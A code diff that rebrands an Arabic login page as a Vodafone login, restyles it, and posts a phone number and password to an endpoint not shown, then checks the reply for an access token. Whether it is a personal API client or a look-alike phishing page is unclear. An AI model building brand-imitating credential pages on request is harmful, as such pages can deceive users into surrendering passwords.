@@ -3,82 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول</title>
+    <title>Vodafone Login</title>
     <style>
         body {
             font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+        }
+        .container {
+            width: 300px;
+            margin: 50px auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+        h2 {
             text-align: center;
-            margin-top: 50px;
         }
-        #errorMessage {
-            color: red;
-            font-size: 14px;
-            margin-top: 10px;
-        }
-        #responseMessage {
-            margin-top: 10px;
-            font-size: 14px;
-        }
-        .input-container {
-            margin-bottom: 15px;
-        }
-        input[type="text"], input[type="password"] {
+        .input-field {
+            width: 100%;
             padding: 10px;
-            width: 80%;
-            font-size: 14px;
-            margin-top: 10px;
-            border-radius: 5px;
-            border: 2px solid #ccc;
-        }
-        input[type="submit"] {
-            padding: 10px 20px;
-            font-size: 14px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            cursor: pointer;
+            margin: 10px 0;
+            border: 1px solid #ccc;
             border-radius: 5px;
         }
-        .success-message {
-            color: green;
+        .input-field.error {
+            border-color: red;
         }
         .error-message {
             color: red;
+            font-size: 12px;
+            margin-bottom: 10px;
+        }
+        .success-message {
+            color: green;
+            font-size: 14px;
+            text-align: center;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:disabled {
+            background-color: #ccc;
+        }
+        .response-text {
+            text-align: center;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
 
-    <h2>تسجيل الدخول</h2>
+    <div class="container">
+        <h2>تسجيل الدخول إلى فودافون</h2>
 
-    <div class="input-container">
-        <label for="phoneNumber">رقم الهاتف</label><br>
-        <input type="text" id="phoneNumber" placeholder="أدخل رقم الهاتف">
-        <div id="phoneError"></div>
+        <input type="text" id="phoneNumber" class="input-field" placeholder="رقم الهاتف" />
+        <div id="phoneError" class="error-message"></div>
+
+        <input type="password" id="password" class="input-field" placeholder="كلمة المرور" />
+        <div id="passwordError" class="error-message"></div>
+
+        <button onclick="submitForm()">Done</button>
+
+        <div id="responseMessage" class="response-text"></div>
     </div>
-
-    <div class="input-container">
-        <label for="password">كلمة المرور</label><br>
-        <input type="password" id="password" placeholder="أدخل كلمة المرور">
-        <div id="passwordError"></div>
-    </div>
-
-    <input type="submit" value="Done" onclick="submitForm()">
-
-    <div id="errorMessage"></div>
-    <div id="responseMessage"></div>
 
     <script>
         async function submitForm() {
             const phoneNumber = document.getElementById('phoneNumber').value;
             const password = document.getElementById('password').value;
-            const errorMessage = document.getElementById('errorMessage');
+            const responseMessage = document.getElementById('responseMessage');
             const phoneError = document.getElementById('phoneError');
             const passwordError = document.getElementById('passwordError');
-            const responseMessage = document.getElementById('responseMessage');
 
             // تنظيف الأخطاء السابقة
-            errorMessage.innerText = '';
             phoneError.innerText = '';
             passwordError.innerText = '';
             responseMessage.innerText = '';
@@ -114,22 +119,27 @@
                     body: formData.toString(),
                 });
 
-                // تحقق من الاستجابة
+                // التحقق من الاستجابة
+                const textResponse = await response.text();  // قراءة الرد كـ نص
                 if (response.ok) {
-                    const data = await response.json();
-                    console.log(data); // عرض بيانات الاستجابة بالكامل في الكونسول
-                    if (data.access_token) {
-                        responseMessage.className = 'success-message';
-                        responseMessage.innerText = 'تم التحقق بنجاح!';
-                    } else {
+                    try {
+                        const data = JSON.parse(textResponse); // محاولة تحويل النص إلى JSON
+                        console.log(data); // عرض بيانات الاستجابة بالكامل في الكونسول
+                        if (data.access_token) {
+                            responseMessage.className = 'success-message';
+                            responseMessage.innerText = 'تم التحقق بنجاح!';
+                        } else {
+                            responseMessage.className = 'error-message';
+                            responseMessage.innerText = `فشل التحقق: ${data.error_description || 'لا يوجد توثيق صالح'}`;
+                        }
+                    } catch (jsonError) {
+                        // إذا كان الرد ليس JSON، عرض محتوى HTML كخطأ
                         responseMessage.className = 'error-message';
-                        responseMessage.innerText = `فشل التحقق: ${data.error_description || 'لا يوجد توثيق صالح'}`;
+                        responseMessage.innerText = `حدث خطأ غير متوقع، الرد من الخادم ليس بتنسيق JSON: ${textResponse}`;
                     }
                 } else {
-                    const errorData = await response.json();
-                    console.log(errorData); // عرض البيانات الخاصة بالخطأ
                     responseMessage.className = 'error-message';
-                    responseMessage.innerText = `فشل الاتصال بالخادم: ${errorData.error_description || 'حدث خطأ غير معروف'}`;
+                    responseMessage.innerText = `فشل الاتصال بالخادم: ${textResponse}`;
                 }
             } catch (error) {
                 responseMessage.className = 'error-message';
@@ -137,5 +147,6 @@
             }
         }
     </script>
+
 </body>
 </html>
